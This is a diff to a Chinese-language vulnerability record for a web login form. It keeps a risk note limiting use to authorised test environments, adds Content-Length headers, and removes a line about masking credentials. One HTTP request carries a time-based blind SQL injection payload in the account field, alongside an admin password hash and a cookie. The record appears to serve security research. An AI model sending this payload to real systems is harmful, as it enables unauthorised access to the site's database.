@@ -43,7 +43,7 @@ schema_version: "1"
 
 ## 操作风险
 
-现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -68,11 +68,12 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 Cookie: windowWidth=1036; windowHeight=846; yid=4m6jbq6mrd5mui6ul2gr3s9fl4; lang=zh-cn; device=desktop; theme=default
 Accept-Language: zh-CN,zh;q=0.9
 Content-Type: application/x-www-form-urlencoded
+Content-Length: 154
 
 account=admin') AND (SELECT 4215 FROM (SELECT(SLEEP(5)))CFVi)-- WUij&password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918&clientId=5E9B11EB90214398ADA353DF7F014E9C&referer=&keepLogin=false
 ```
 
-> 请求长度说明：原资料 Content-Length 为 154；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 154；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 
 ```http
@@ -85,11 +86,12 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 Cookie: windowWidth=1036; windowHeight=846; yid=4m6jbq6mrd5mui6ul2gr3s9fl4; lang=zh-cn; device=desktop; theme=default
 Accept-Language: zh-CN,zh;q=0.9
 Content-Type: application/x-www-form-urlencoded
+Content-Length: 154
 
 account=admin&password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918&clientId=5E9B11EB90214398ADA353DF7F014E9C&referer=&keepLogin=false
 ```
 
-> 请求长度说明：原资料 Content-Length 为 154；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 154；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 
 > 原文: <https://www.yuque.com/xiaokp7/ocvun2/iqb1350wkn2bu5qd>
